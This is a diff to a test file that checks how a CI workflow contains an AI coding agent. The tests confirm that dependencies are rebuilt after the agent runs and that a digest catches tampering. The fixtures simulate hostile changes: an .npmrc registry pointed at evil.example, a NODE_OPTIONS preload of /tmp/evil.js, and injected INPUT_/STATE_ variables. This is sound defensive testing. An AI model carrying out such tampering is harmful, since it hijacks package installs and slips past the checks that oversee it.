@@ -264,15 +264,19 @@ test("every agent step is followed by a dependency rebuild before any repository
   // execute on the next import, which is the boundary check itself.
   const isAgent = (s) => s.uses?.startsWith("anthropics/claude-code-action@");
   const isRebuild = (s) => s.name === "Guard the executable surface and rebuild dependencies";
-  // Commentary is not behaviour: a comment naming node or bun is not a run
-  // of either, and reading it as one has bitten this file before. Neither is
-  // naming one as a word in a list -- `for c in git node bun gh` asks where
-  // they are, it does not run them -- so this looks at command position.
+  // Commentary is not behaviour: a comment naming node or bun is not a run of
+  // either, and reading it as one has bitten this file before. Neither is
+  // naming one in a word list -- `for c in git node bun gh` asks where they
+  // are, it does not run them. Everything else counts: `then node ...`,
+  // `do bun ...` and `env FOO=1 node ...` are all runs, and a test whose job is
+  // to prove nothing runs before the rebuild must not be the thing that misses
+  // one.
   const runsRepoCode = (s) =>
     (s.run ?? "")
       .split("\n")
       .filter((l) => !/^\s*#/.test(l))
-      .some((l) => /(^|[;&|(]\s*)(node|bun|npm)\s/.test(l.trim()));
+      .map((l) => l.trim())
+      .some((l) => /(^|\s)(node|bun|npm)\s/.test(l) && !/^for\s+\w+\s+in\s/.test(l));
   let checked = 0;
   for (const job of ["author", "review"]) {
     const steps = workflow.jobs[job].steps;
@@ -614,7 +618,7 @@ test("every agent is bracketed by a snapshot and a verification of what the next
   const workflow = parseYaml(
     readFileSync(new URL("../.github/workflows/content-replenish.yml", import.meta.url), "utf8"),
   );
-  // The grant is filesystem-wide, so the boundary check -- which is expressed
+  // The grant reaches every file in the workspace, so the boundary check -- expressed
   // in repository terms and exempts _run/ -- is not enough on its own. What
   // closes it is a digest taken before the agent and compared after, with the
   // expected value in the snapshot step's OUTPUT rather than in a file the
@@ -1074,7 +1078,7 @@ test("the snapshot-and-verify pair, run as bash, catches what it claims to", () 
   assert.equal(
     fixture((_dir, home) => writeFileSync(join(home, ".npmrc"), "registry=https://evil.example\n")),
     1,
-    "$HOME is outside the workspace and every repo-relative check",
+    "$HOME is outside every repo-relative check, and confinement to the workspace is the CLI's, not ours",
   );
   assert.equal(
     fixture((_dir, _home, env) => ({ ...env, NODE_OPTIONS: "--require /tmp/evil.js" })),
@@ -1100,6 +1104,14 @@ test("the snapshot-and-verify pair, run as bash, catches what it claims to", () 
     fixture((_dir, _home, env) => ({ ...env, SOMETHING_NEW: "x" })),
     1,
     "a variable the agent appended to $GITHUB_ENV is visible as a variable, whatever its name",
+  );
+  assert.equal(
+    // The runner sets INPUT_* when it invokes an action, never for a `run:`
+    // step, so here the namespace has exactly one possible origin -- and
+    // download-artifact reads INPUT_GITHUB-TOKEN from it.
+    fixture((_dir, _home, env) => ({ ...env, INPUT_GITHUB_TOKEN: "x", STATE_x: "y" })),
+    1,
+    "INPUT_* and STATE_* are not excluded from the comparison",
   );
   assert.equal(
     fixture(
